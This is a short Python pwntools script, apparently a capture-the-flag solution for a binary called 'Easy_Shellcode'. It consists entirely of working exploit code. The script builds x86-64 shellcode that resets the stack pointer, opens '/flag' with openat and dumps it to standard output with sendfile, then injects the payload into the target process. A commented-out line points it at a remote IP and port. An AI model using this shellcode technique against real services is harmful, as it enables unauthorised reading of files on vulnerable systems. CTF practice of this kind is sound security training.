from pwn import *
#context(arch = 'amd64', os = 'linux', log_level = 'debug')
context(arch = 'amd64', os = 'linux')
p = process('./Easy_Shellcode')
#p = remote("10.252.113.234",4723)
elf = ELF('./Easy_Shellcode')
#libc = ELF('./libc.so.6')

shellcode = '''
    mov rsp, 0x4040c0
'''
shellcode += shellcraft.openat(-100, "/flag", 0, 0)
shellcode += shellcraft.sendfile(1, 3, 0, 0x100)

payload = asm(shellcode)
p.sendlineafter(b'Welcome', payload)

p.interactive()
